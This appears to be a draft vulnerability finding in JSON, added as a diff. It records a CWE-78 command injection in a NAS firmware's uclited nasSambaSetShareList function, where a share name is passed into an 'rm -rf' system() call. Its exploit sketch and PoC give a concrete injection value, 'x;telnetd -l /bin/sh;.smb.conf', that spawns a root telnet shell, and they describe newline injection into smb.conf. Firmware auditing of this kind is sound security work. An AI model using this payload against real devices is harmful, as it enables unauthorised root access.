@@ -1,0 +1,30 @@
+{
+  "job_id": "3a1f3c822c22",
+  "title": "uclited nasSambaSetShareList 共享名拼接 rm -rf 命令注入（CWE-78）",
+  "severity": "high",
+  "confidence": 0.5,
+  "vuln_class": "command-injection",
+  "cwe": "CWE-78",
+  "binary_md5": "d61e67ed20163b7fee8bd3c606fb0331",
+  "binary_path": "firmware/binwalk_extracted/firmware.extracted/100000/squashfs-root/usr/bin/uclited",
+  "reachability": "static-only",
+  "summary": "uclited nasSambaSetShareList（0x4a63ec）在应用 Samba 共享配置时（服务类型 a1+68 != 0 分支），将配置结构中的共享名（a1+80 或 a1+256，按 a1+76 选择）直接拼进 snprintf(v6[128], \\\"rm -rf /tmp/samba/%s.smb.conf\\\", name) 后 system(v6)。共享名来源于认证后 Web 的 NAS 文件夹共享页（/userRpm/NasFolderSharingRpm.htm 等）下发的 ucm 配置（回环 IPC 127.0.0.1:51237），无 shell 元字符过滤。共享名含 ; 或 $(...) 即 root 命令注入；snprintf 长度受限于 0x7F（127 字节），在限长内即可注入。仅 snprintf 限制命令总长，不构成过滤。",
+  "evidence": [
+    "uclited nasSambaSetShareList 0x4a63ec: v2=*(a1+76); snprintf(v6,0x80,\"rm -rf /tmp/samba/%s.smb.conf\", (a1+80) 或 (a1+256)); system(v6); 仅在 *(a1+68)==1||2 分支",
+    "同函数 0x4a63ec:43 另通过 sprintf(v5, off_53F494, name, \"/tmp/usbdisk/\", name) 写 smb.conf（共享名含 \\n 可注入 smb.conf 指令）",
+    "callers: uclited 内 6 处调用（nasSambaStop/Start 及配置应用链），httpd 同构写配置函数 0x5463e0 仅写文件无 system，system 在 uclited 侧",
+    "共享名结构字段 a1+80/a1+256 与 smb.conf 输出的同名共享名一致"
+  ],
+  "session_id": "s-mt4rda4n-55d3",
+  "function_name": "nasSambaSetShareList",
+  "preconditions": "管理员认证；Samba 共享服务启用（服务类型字段 a1+68 为 1/2）；共享名在 Web 端不做 shell 字符过滤（该固件为旧版 TP-Link NAS 页，仅限制长度与基本字符）",
+  "exploit_sketch": "共享名注入仅需命令分隔符：x;telnetd -l /bin/sh;.smb.conf。system 由 /bin/sh 解析，; 直接执行后段命令。snprintf 上限 127 字节足够。若共享名内嵌 %0a + smb.conf 指令（read only/guest ok/path）可实现 SMB 提权访问，辅助横向。",
+  "poc": "管理员登录后：1) 启用 Samba 服务并新建共享文件夹；2) 共享名字段填：x;telnetd -l /bin/sh;.smb.conf（≤127 字节）；3) 保存。uclited 执行 system(\\\"rm -rf /tmp/samba/x;telnetd -l /bin/sh;.smb.conf.smb.conf\\\") → 23 端口 root shell。静态分析，未动态复核。",
+  "call_chain": "管理员认证 POST NAS 共享配置页（设置/删除共享文件夹,samba 开启） → httpd NAS 配置处理 → ucm 协议 IPC（127.0.0.1:51237 TCP） → uclited ucm_msgTaskCreate(0x41f3fc) recv/分帧 → ucm_cfg_handler → nasSambaSetShareList(0x4a63ec) → snprintf(v6[128],\\\"rm -rf /tmp/samba/%s.smb.conf\\\", shareName@a1+80/a1+256) → system(v6)（root）",
+  "function_addr": "0x4a63ec",
+  "id": "F-mt4rzh23-e931",
+  "status": "draft",
+  "owner": "token-admin",
+  "recorded_at": "2026-08-22T19:32:47Z",
+  "history": []
+}
